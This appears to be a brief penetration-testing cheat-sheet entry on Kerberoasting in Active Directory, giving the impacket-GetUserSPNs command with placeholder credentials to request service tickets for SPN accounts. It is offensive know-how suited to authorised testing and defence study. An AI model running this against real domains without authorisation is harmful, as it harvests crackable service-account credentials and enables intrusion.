Any domain user can request (TGS) for services registered with an SPN.

Requirements:
- any valid domain joined user creds
```shell
impacket-GetUserSPNs <domain>/<user>:<password> -dc-ip <DC_IP> -request


```
